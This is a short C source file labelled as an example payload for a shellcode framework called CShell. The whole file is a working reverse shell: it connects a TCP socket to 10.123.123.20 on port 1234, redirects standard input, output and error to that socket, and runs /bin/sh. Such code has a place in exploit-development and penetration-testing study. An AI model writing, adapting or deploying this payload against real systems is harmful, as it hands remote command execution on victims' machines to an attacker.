#include "cshell.h"

#define BLOCK_SIZE 0x100
#define HTONS(A) ((((uint16_t)(A) & 0xff00) >> 8) | (((uint16_t)(A) & 0x00ff) << 8))
#define OCTETS(a, b, c, d) (uint32_t)((d << 24) | (c << 16) | (b << 8) | (a))

/* An example CShell payload */

int _start();

int _start()
{
    int sockfd, i;
    unsigned char filename[] = {'/', 'b', 'i', 'n', '/', 's', 'h', '\0'};
    ssize_t status, err;
    struct in_addr sock_addr;
    struct sockaddr_in sock_srv;

    status = cs_socket(AF_INET, SOCK_STREAM, 0);
    if(status < 0)
    {
        goto cleanup;
    }
    sockfd = status;
    
    sock_addr.s_addr = OCTETS(10, 123, 123, 20);

    sock_srv.sin_family = AF_INET;
    sock_srv.sin_port = HTONS(1234);
    sock_srv.sin_addr = sock_addr;

    status = cs_connect(sockfd, &sock_srv, sizeof(sock_srv));
    if(status < 0)
    {
        goto cleanup;
    }

    for(i = 0; i <= 2; ++i)
    {
        cs_dup2(sockfd, i);
    }

    cs_execve(filename, NULL, NULL);
    status = 0;

close_cleanup:
    cs_close(sockfd);

cleanup:
    if(status < 0)
    {
        err = cs_err(status);
    }
    else
    {
        err = 0;
    }

    cs_exit(err);
}
